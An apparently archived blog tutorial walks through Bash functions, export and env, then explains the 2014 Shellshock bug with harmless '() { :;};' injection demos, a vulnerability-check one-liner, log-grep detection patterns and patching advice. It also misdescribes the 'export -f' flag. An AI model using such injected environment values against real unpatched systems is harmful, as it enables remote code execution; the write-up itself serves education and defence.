&lt;p&gt;Of course, there are &lt;a href="http://en.wikipedia.org/wiki/Comparison_of_command_shells"&gt;other command shells out there&lt;/a&gt;. However, Bash is the default shell for most of the Linux systems (and Linux-based systems), including many Debian-based distributions and the Red Hat &amp;amp; Fedora &amp;amp; CentOS combo.&lt;/p&gt;
&lt;h3&gt;Functions in Bash&lt;/h3&gt;
&lt;p&gt;The interesting stuff comes from the fact that Bash  is also a scripting language, with the ability to define functions. This is super useful when you are writing scripts. For example, &lt;code&gt;hello.sh&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="k"&gt;function &lt;/span&gt;hello &lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="nb"&gt;echo &lt;/span&gt;Hello!
&lt;span class="o"&gt;}&lt;/span&gt;
hello
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;which can be called as:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;chmod a+x hello.sh
&lt;span class="nv"&gt;$ &lt;/span&gt;./hello.sh
Hello!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A function may be compacted into a single line. You just need to choose a name and put a &lt;code&gt;()&lt;/code&gt; after it. Everything inside &lt;code&gt;{}&lt;/code&gt; will belong to the scope of your function.&lt;/p&gt;
&lt;p&gt;For example, we can create a function &lt;code&gt;bashiscool&lt;/code&gt; that uses &lt;code&gt;echo&lt;/code&gt;  to display message on the standard output:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;bashiscool&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Bash is actually Fun&amp;quot;&lt;/span&gt;; &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;bashiscool
Bash is actually Fun
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Child Processes   and the  &lt;code&gt;export&lt;/code&gt;  command&lt;/h3&gt;
&lt;p&gt;We can make things even more interesting. The statement &lt;code&gt;bash -c&lt;/code&gt; can be used to execute a new instance of Bash, as a subprocess,  to run new commands (&lt;code&gt;-c&lt;/code&gt; passes a string with a command). The catch is that the child process does not inherit the functions  or variables that we defined in the parent:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;bash -c bashiscool &lt;span class="c"&gt;# spawn nested shell&lt;/span&gt;
bash: bashiscool: &lt;span class="nb"&gt;command &lt;/span&gt;not found
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So before executing a new instance of Bash, we need to export the &lt;strong&gt;environment variables&lt;/strong&gt; to the child. That's why we need the &lt;code&gt;export&lt;/code&gt; command. In the example below, the flag &lt;code&gt;-f&lt;/code&gt; means &lt;em&gt;read key bindings from filename&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; -f bashiscool
&lt;span class="nv"&gt;$ &lt;/span&gt;bash -c bashiscool &lt;span class="c"&gt;# spawn nested shell&lt;/span&gt;
Bash is actually Fun
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In other words, first the &lt;code&gt;export&lt;/code&gt; command creates a &lt;strong&gt;regular environment variable&lt;/strong&gt; containing the function definition. Then, the second shell reads the environment. If it sees a variable that looks like a function, it evaluates this function!&lt;/p&gt;
&lt;h3&gt;A Simple Example of an Environment Variable&lt;/h3&gt;
&lt;p&gt;Let's  see how environment variables work examining some &lt;em&gt;builtin&lt;/em&gt; Bash command. For instance, a very popular one,  &lt;code&gt;grep&lt;/code&gt;, is used to search for pattern in files (or the standard input).&lt;/p&gt;
&lt;p&gt;Running &lt;code&gt;grep&lt;/code&gt; in a file that contains the word 'fun' will return the line where this word is. Running &lt;code&gt;grep&lt;/code&gt; with a flag &lt;code&gt;-v&lt;/code&gt; will return the non-matching lines, &lt;em&gt;i.e.&lt;/em&gt; the lines where the word 'fun' does not appear:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bash can be super fun&amp;#39;&lt;/span&gt; &amp;gt; file.txt
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bash can be dangerous&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; file.txt
&lt;span class="nv"&gt;$ &lt;/span&gt;cat file.txt
 bash can be super fun
 bash can be dangerous
&lt;span class="nv"&gt;$ &lt;/span&gt;grep fun file.txt
 bash can be super fun
&lt;span class="nv"&gt;$ &lt;/span&gt;grep -v fun file.txt
 bash can be dangerous
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;grep&lt;/code&gt; command uses an environment variable called &lt;strong&gt;GREP_OPTIONS&lt;/strong&gt; to set default options. This variable is usually set to:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$GREP_OPTIONS&lt;/span&gt;
--color&lt;span class="o"&gt;=&lt;/span&gt;auto
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To update or create a new environment variable, it is not enough to use the Bash syntax &lt;code&gt;GREP_OPTIONS='-v'&lt;/code&gt;, but instead we  need to call the &lt;em&gt;builtin&lt;/em&gt; &lt;code&gt;export&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ GREP_OPTIONS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-v&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;grep fun file.txt
 bash can be super fun
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;GREP_OPTIONS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-v&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;grep fun file.txt
 bash can be dangerous
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;The  &lt;code&gt;env&lt;/code&gt;  command&lt;/h3&gt;
&lt;p&gt;Another Bash &lt;em&gt;builtin&lt;/em&gt;, the &lt;code&gt;env&lt;/code&gt;  prints the environment variables. But it can also  be used to run a single command with an exported variable (or variables) given to that command. In this case, &lt;code&gt;env&lt;/code&gt; starts a new process, then it modifies the environment, and then it calls the command that was provided as an argument (the &lt;code&gt;env&lt;/code&gt; process is  replaced by the command process).&lt;/p&gt;
&lt;p&gt;In practice, to use &lt;code&gt;env&lt;/code&gt;  to run commands, we:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;set&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;environment&lt;/span&gt; &lt;span class="nx"&gt;variable&lt;/span&gt; &lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="kd"&gt;with&lt;/span&gt; &lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;spawn&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt; &lt;span class="nx"&gt;using&lt;/span&gt; &lt;span class="nx"&gt;bash&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;pass&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;command&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;we&lt;/span&gt; &lt;span class="nx"&gt;want&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;run&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nx"&gt;example&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;grep&lt;/span&gt; &lt;span class="nx"&gt;fun&lt;/span&gt; &lt;span class="nx"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;txt&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nv"&gt;GREP_OPTIONS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-v&amp;#39;&lt;/span&gt; | grep fun file.txt    &lt;span class="c"&gt;# this does not work, we need another shell&lt;/span&gt;
bash can be super fun
&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nv"&gt;GREP_OPTIONS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-v&amp;#39;&lt;/span&gt; bash -c &lt;span class="s1"&gt;&amp;#39;grep fun file.txt&amp;#39;&lt;/span&gt;  &lt;span class="c"&gt;# here we go&lt;/span&gt;
bash can be dangerous
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Facing the Shellshock Vulnerability&lt;/h3&gt;
&lt;p&gt;What if we pass some function to the variable definition?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nv"&gt;GREP_OPTIONS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;() { :;};&amp;#39;&lt;/span&gt; bash -c &lt;span class="s1"&gt;&amp;#39;grep fun file.txt&amp;#39;&lt;/span&gt;
grep: &lt;span class="o"&gt;{&lt;/span&gt;: No such file or directory
grep: :;&lt;span class="o"&gt;}&lt;/span&gt;;: No such file or directory
grep: fun: No such file or directory
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since the things we added are strange when parsed to the command &lt;code&gt;grep&lt;/code&gt;, it won't understand them.&lt;/p&gt;
&lt;p&gt;What if we add stuff &lt;em&gt;after&lt;/em&gt; the function? Things start to get weirder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nv"&gt;GREP_OPTIONS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-v () { :;}; echo NOOOOOOOOOOOOOOO!&amp;#39;&lt;/span&gt; bash -c &lt;span class="s1"&gt;&amp;#39;grep fun file.txt&amp;#39;&lt;/span&gt;
grep: &lt;span class="o"&gt;{&lt;/span&gt;: No such file or directory
grep: :;&lt;span class="o"&gt;}&lt;/span&gt;;: No such file or directory
grep: &lt;span class="nb"&gt;echo&lt;/span&gt;: No such file or directory
grep: NOOOOOOOOOOOOOOO!: No such file or directory
grep: fun: No such file or directory
file.txt:bash can be super fun
file.txt:bash can be dangerous
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Did you notice the confusion? &lt;em&gt;Both&lt;/em&gt; matches and non-matches were printed! It means that some stuff was parsed well! When in doubt, Bash appears to do &lt;em&gt;everything&lt;/em&gt;?&lt;/p&gt;
&lt;p&gt;Now, what if we just keep the function, taking out the only thing that makes sense, &lt;code&gt;-v&lt;/code&gt;?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nv"&gt;GREP_OPTIONS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;() { :;}; echo NOOOOOOOOOOOOOOO!&amp;#39;&lt;/span&gt; bash -c &lt;span class="s1"&gt;&amp;#39;grep fun file.txt&amp;#39;&lt;/span&gt;
NOOOOOOOOOOOOOOO!
grep: &lt;span class="o"&gt;{&lt;/span&gt;: No such file or directory
grep: :: No such file or directory
grep: &lt;span class="o"&gt;}&lt;/span&gt;: No such file or directory
grep: fun: No such file or directory
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Did you notice that &lt;code&gt;echo NOOOOOOOOOOOOOOO!&lt;/code&gt; was executed normally? &lt;strong&gt;This is the (first) Shellshock bug!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This works because when the new shell sees an environment variable beginning with &lt;code&gt;()&lt;/code&gt;, it gets the variable name and executes the  string following it. This  includes executing anything after the function, &lt;em&gt;i.e&lt;/em&gt;, the evaluation does not stop when the end of the function definition is reached!&lt;/p&gt;
&lt;p&gt;Remember that &lt;code&gt;echo&lt;/code&gt; is not the only thing we can do. The possibilities are unlimited! For example, we can issue any &lt;code&gt;/bin&lt;/code&gt; command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nv"&gt;GREP_OPTIONS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;() { :;}; /bin/ls&amp;#39;&lt;/span&gt; bash -c &lt;span class="s1"&gt;&amp;#39;grep fun file.txt&amp;#39;&lt;/span&gt;
anaconda  certificates  file.txt  IPython
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;WOW.&lt;/p&gt;
&lt;p&gt;Worse, we  actually don't need to use a system environment variable nor even call a real command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nb"&gt;test&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;() { :;}; echo STILL NOOOOOOOO!!!!&amp;#39;&lt;/span&gt; bash -c :
STILL NOOOOOOOO!!!!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In the example above, &lt;code&gt;env&lt;/code&gt; runs a command with an arbitrary  variable  (test)  set to some function (in this case is just a single &lt;code&gt;:&lt;/code&gt;, a Bash command defined as doing nothing). The semi-colon signals the end of the function definition. Again, the bug is in the fact that there's nothing stopping the parsing of what is after the semi-colon!&lt;/p&gt;
&lt;p&gt;Now it's easy to see if your system is vulnerable, all you need to do is run:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nv"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;() { :;}; echo The system is vulnerable!&amp;#39;&lt;/span&gt; bash -c :
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That simple.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;There is more than one!&lt;/h2&gt;
&lt;p&gt;The Shellshock vulnerability is  an example of an &lt;a href="http://en.wikipedia.org/wiki/Arbitrary_code_execution"&gt;arbitrary code execution&lt;/a&gt; (ACE) vulnerability, which is executed on running programs. An attacker will use an ACE vulnerability to run a program that gives her a simple way of controlling the targeted machine. This is nicely achieved by running a Shell such as Bash.&lt;/p&gt;
&lt;p&gt;It is not surprising that right after a patch for &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271"&gt;CVE-2014-6271&lt;/a&gt; was released, several new issues were opened:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169"&gt;CVE-2014-7169&lt;/a&gt;: Right after the first bug was disclosed, a &lt;a href="https://twitter.com/taviso/status/514887394294652929"&gt;tweet&lt;/a&gt; from &lt;a href="http://taviso.decsystem.org/"&gt;Tavis Ormandy&lt;/a&gt;  showed a &lt;em&gt;further parser error&lt;/em&gt; that became the second vulnerability:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="nv"&gt;X&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;a&lt;span class="o"&gt;)=&lt;/span&gt;&amp;gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt; bash -c &lt;span class="s2"&gt;&amp;quot;echo vulnerable&amp;quot;&lt;/span&gt;; bash -c &lt;span class="s2"&gt;&amp;quot;echo Bug CVE-2014-7169 patched&amp;quot;&lt;/span&gt;
vulnerable
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7186"&gt;CVE-2014-7186&lt;/a&gt; and &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7187"&gt;CVE-2014-7187&lt;/a&gt;: A little after the second bug, two other bugs were found by &lt;a href="http://www.enyo.de/fw/"&gt;Florian Weimer&lt;/a&gt;. One concerning &lt;em&gt;out of bound memory read error&lt;/em&gt; in &lt;a href="http://tools.cisco.com/security/center/viewAlert.x?alertId=35860"&gt;redir_stack&lt;/a&gt; and the other an &lt;em&gt;off-by-one error in nested loops&lt;/em&gt;. You can check these vulnerabilities in your system &lt;a href="https://github.com/hannob/bashcheck"&gt;with this script&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6277"&gt;CVE 2014-6277&lt;/a&gt; and &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278"&gt;CVE 2014-6278&lt;/a&gt;: A couple of days ago, these new bugs were found by &lt;a href="http://lcamtuf.blogspot.de/2014/09/bash-bug-apply-unofficial-patch-now.html"&gt;Michal Zalewski&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;What do you think, is Shellshock &lt;a href="http://blog.erratasec.com/2014/09/the-shockingly-bad-code-of-bash.html"&gt;just a blip&lt;/a&gt;?&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Suggestions to Protect Your System&lt;/h2&gt;
&lt;p&gt;Several patches have been released since the Shellshock vulnerabilities were found. Although at this point they &lt;a href="https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/"&gt;seem to solve most of the problem&lt;/a&gt;, below are some  recommendations to keep your system safer:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Update your system!  And keep updating it... Many Linux distributions have released new Bash software versions, so follow the instructions of your distribution. In most of the cases, a simple &lt;code&gt;yum update&lt;/code&gt; or &lt;code&gt;apt-get update&lt;/code&gt; or similar will do it. If you have several servers, the script below can be helpful:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="nv"&gt;servers&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;
120.120.120.120
10.10.10.10
22.22.22.22
&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for &lt;/span&gt;server in &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;servers&lt;/span&gt;&lt;span class="p"&gt;[@]&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt;
ssh &lt;span class="nv"&gt;$server&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;yum -y update bash&amp;#39;&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Update firmware on your router or any other web-enabled devices, as soon as they become available. Remember  to only download patches  from reputable sites (only HTTPS please!), since scammers will likely try to take advantage of Shellshock reports.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Keep an eye on all of your accounts for signs of unusual activity. Consider changing important passwords.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP requests to CGI scripts have been identified as the major attack vector. Disable any  scripts that call on the shell (however, it does not fully mitigate the vulnerability). To check if your system is vulnerable you can use &lt;a href="http://milankragujevic.com/projects/shellshock/"&gt;this online scanner&lt;/a&gt;. Consider &lt;a href="https://access.redhat.com/articles/1212303"&gt;mod_security&lt;/a&gt; if you're not already using it.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Because the HTTP requests used by Shellshock exploits are quite unique, monitor logs with keywords such as &lt;code&gt;grep '() {'  access_log&lt;/code&gt;or &lt;code&gt;cat access_log |grep "{ :;};"&lt;/code&gt;. Some common places for http logs are: &lt;code&gt;cPanel: /usr/local/apache/domlogs/&lt;/code&gt;, &lt;code&gt;Debian/Apache: /var/log/apache2/&lt;/code&gt;, or &lt;code&gt;CentOS: /var/log/httpd/&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://access.redhat.com/articles/1212303"&gt;Firewall and network filters&lt;/a&gt; can be set to block requests that contain a signature for the attack, &lt;em&gt;i.e&lt;/em&gt; &lt;code&gt;“() {“&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If case of an attack, publish the attacker's information! You can use &lt;a href="http://www.grymoire.com/Unix/Awk.html"&gt;awk&lt;/a&gt;  and  &lt;a href="http://en.wikipedia.org/wiki/Uniq"&gt;uniq&lt;/a&gt; (where &lt;em&gt;print $1&lt;/em&gt; means print the first column) to get her IP, for example:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat log_file |grep &lt;span class="s2"&gt;&amp;quot;{ :;};&amp;quot;&lt;/span&gt; | awk &lt;span class="s1"&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt;|uniq
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;If you are on a managed hosting subscription, check your company's status. For example: &lt;a href="https://docs.acquia.com/articles/september-2014-gnu-bash-upstream-security-vulnerability"&gt;Acquia&lt;/a&gt;, &lt;a href="https://status.heroku.com/incidents/665"&gt;Heroku&lt;/a&gt;, &lt;a href="http://status.mediatemple.net/"&gt;Mediatemple&lt;/a&gt;, and &lt;a href="https://status.rackspace.com/"&gt;Rackspace&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Update your Docker containers and  AWS instances.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If you are running production systems that don't need exported functions at all, take a look at &lt;a href="https://github.com/dlitz/bash-shellshock"&gt;this wrapper&lt;/a&gt; that refuses to run bash if any environment variable's value starts with a left-parent.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Further  References&lt;/h2&gt;
&lt;h4&gt;Reviews&lt;/h4&gt;
&lt;p&gt;&lt;a href="http://stephane.chazelas.free.fr"&gt;http://stephane.chazelas.free.fr/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack"&gt;https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://lcamtuf.blogspot.co.uk/2014/09/quick-notes-about-bash-bug-its-impact.html"&gt;http://lcamtuf.blogspot.co.uk/2014/09/quick-notes-about-bash-bug-its-impact.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.openwall.com/lists/oss-security/2014/09/24/11"&gt;http://www.openwall.com/lists/oss-security/2014/09/24/11&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://blog.erratasec.com/2014/09/bash-bug-as-big-as-heartbleed.html#.VCNbefmSx8G"&gt;http://blog.erratasec.com/2014/09/bash-bug-as-big-as-heartbleed.html#.VCNbefmSx8G&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://seclists.org/oss-sec/2014/q3/649"&gt;http://seclists.org/oss-sec/2014/q3/649&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.circl.lu/pub/tr-27/#recommendations"&gt;http://www.circl.lu/pub/tr-27/#recommendations&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.troyhunt.com/2014/09/everything-you-need-to-know-about.html"&gt;http://www.troyhunt.com/2014/09/everything-you-need-to-know-about.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html"&gt;http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;Bugs Description&lt;/h4&gt;
&lt;p&gt;&lt;a href="http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-025"&gt;http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-025&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-026"&gt;http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-026&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-027"&gt;http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-027&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://blog.cloudflare.com/inside-shellshock/"&gt;http://blog.cloudflare.com/inside-shellshock/&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;Proof-of-Concept Attacks&lt;/h4&gt;
&lt;p&gt;&lt;a href="http://research.zscaler.com/2014/09/shellshock-attacks-spotted-in-wild.html"&gt;http://research.zscaler.com/2014/09/shellshock-attacks-spotted-in-wild.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.clevcode.org/cve-2014-6271-shellshock/"&gt;http://www.clevcode.org/cve-2014-6271-shellshock/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.invisiblethreat.ca/2014/09/cve-2014-6271/"&gt;https://www.invisiblethreat.ca/2014/09/cve-2014-6271/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://marc.info/?l=qmail&amp;amp;m=141183309314366&amp;amp;w=2"&gt;http://marc.info/?l=qmail&amp;amp;m=141183309314366&amp;amp;w=2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.dfranke.us/posts/2014-09-27-shell-shock-exploitation-vectors.html"&gt;https://www.dfranke.us/posts/2014-09-27-shell-shock-exploitation-vectors.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/"&gt;https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.invisiblethreat.ca/2014/09/cve-2014-6271/"&gt;https://www.invisiblethreat.ca/2014/09/cve-2014-6271/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://pastebin.com/VyMs3rRd"&gt;http://pastebin.com/VyMs3rRd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://infosecnirvana.com/shellshock-hello-honeypot/"&gt;http://infosecnirvana.com/shellshock-hello-honeypot/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://isc.sans.edu/forums/diary/Shellshock+A+Collection+of+Exploits+seen+in+the+wild/18725"&gt;https://isc.sans.edu/forums/diary/Shellshock+A+Collection+of+Exploits+seen+in+the+wild/18725&lt;/a&gt;&lt;/p&gt;
